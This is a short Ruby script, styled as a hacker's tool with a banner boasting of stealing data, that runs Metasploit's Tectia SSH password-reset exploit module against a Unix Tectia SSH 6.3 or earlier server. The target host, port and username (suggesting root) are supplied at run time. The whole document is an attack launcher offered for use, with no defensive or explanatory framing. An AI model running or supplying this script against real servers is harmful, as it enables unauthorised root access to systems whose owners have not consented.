puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

      Tectia SSH USERAUTH Change Request 
		Password Reset Vulnerability

	 	 Unix-based Tectia SSH 6.3 or prior

       		 Starting Port:: 22   

"""

puts " [?] What is the target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Start with 22]  "
print "[!] ---> "

port = gets.chomp

puts " [?] What is the Username? [root, toor] "
print "[!] ---> "

name = gets.chomp


exec("msfconsole -x 'use exploit/unix/ssh/tectia_passwd_changereq' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set USERNAME #{name}' -x 'run' 'run'")
